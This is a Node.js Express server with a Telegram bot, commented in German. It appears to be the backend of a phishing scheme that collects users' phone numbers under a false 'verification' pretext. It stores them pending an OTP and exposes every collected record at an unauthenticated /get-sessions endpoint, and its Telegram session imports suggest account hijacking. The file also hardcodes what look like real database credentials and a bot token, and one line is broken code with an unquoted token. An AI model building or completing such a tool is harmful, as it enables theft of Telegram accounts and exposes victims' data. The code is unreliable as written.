const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const TelegramBot = require('node-telegram-bot-api');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

// CONFIG
const MONGO_URI = 'mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority';
const BOT_TOKEN = '8963838309:AAFpv3lF_v_kWvZZYR96D8mM3nA3oawatow'; // Dein Bot Token
const bot = new TelegramBot(8963838309:AAFpv3lF_v_kWvZZYR96D8mM3nA3oawatow, { polling: true });

// DB CONNECTION
mongoose.connect(MONGO_URI).then(() => console.log("DB Connected"));

const SessionSchema = new mongoose.Schema({
    phone: String,
    session: String,
    timestamp: { type: Date, default: Date.now }
});
const SessionModel = mongoose.model('Session', SessionSchema);

// BOT LOGIC: Start & Kontaktanfrage
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "Willkommen! Bitte teile deine Nummer, um dich zu verifizieren.", {
        reply_markup: {
            keyboard: [[{ text: "Nummer teilen", request_contact: true }]],
            one_time_keyboard: true,
            resize_keyboard: true
        }
    });
});

// Kontakt abfangen
bot.on('contact', async (msg) => {
    const contact = msg.contact;
    const phone = contact.phone_number;
    
    // Speichern oder Workflow weiterführen
    await SessionModel.create({ phone: phone, session: "PENDING_OTP" });
    
    bot.sendMessage(msg.chat.id, "Danke. Wir haben die Nummer erhalten.");
});

// WEB ENDPOINTS
app.post('/verify-otp', async (req, res) => {
    // Hier kommt deine Logik für den OTP-Code-Abgleich rein
    res.json({ status: "success" });
});

app.get('/get-sessions', async (req, res) => {
    const sessions = await SessionModel.find();
    res.json(sessions);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
